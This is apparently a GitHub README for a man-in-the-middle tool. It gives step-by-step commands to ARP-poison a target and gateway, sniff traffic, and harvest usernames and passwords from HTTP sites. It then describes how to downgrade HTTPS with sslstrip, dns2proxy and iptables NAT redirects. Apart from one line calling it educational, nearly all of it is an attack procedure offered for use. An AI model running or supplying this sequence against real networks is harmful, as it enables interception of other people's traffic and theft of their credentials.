# MITM-tool
Man in the middle attack tool makes arp poisoning and packet listening. Usage descriptions are in the README file

MITM is known as one of the most common attack and this tool do this attack. This repo include arp poisoner and packet listener python files. This is educational repository so don't try this tool over other users. Firstly run arp_poisoner.py then packet_listener.py also you can use wireshark instead of packet_listener.py
![Image of Yaktocat](https://i0.wp.com/hackonology.com/wp-content/uploads/2019/10/man-in-the-middle-attack.png?w=893&ssl=1)

# Requirements

Operating system: Linux

Libraries: 
```bash
> pip install scapy 
> pip install sslstrip
```
# Arp poisoner usage
```bash
> python3 arp_poisoner.py -t <target ip> -g <gateway ip>
```

# Packet listener usage
if you want to see all packets by sent target user you should use option 1  
```bash
Option 1 ->  python3 packetlistener.py --all <interface>
```
if you want to see just user infos like username and password when a user go into http sites you should use option 2 
```bash    
Option 2 -> python3 packetlistener.py --userinfos <interface>
```

# HTTPS to HTTP downgrade
This tool is working on http websites, if you want to get https website's packets we need to downgrade https to http.
There is a tool called sslstrip for this, we need to use it and also dns2proxy tool should be installed.

**STEP 1**
```bash
root@kali:~#  git clone https://github.com/singe/dns2proxy
root@kali:~/dns2proxy#  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
root@kali:~/dns2proxy#  iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
```
**STEP 2**
```bash
> python3 arp_poisoner.py -t <target ip> -g <gateway ip>
```
***STEP3*** 
```bash
> python3 packetlistener.py --userinfos <interface>    or    python3 packetlistener.py --all <interface>
```
**STEP 4**
```bash
> sslstrip
```
**STEP 5**
```bash
> python3 dns2proxy.py
```
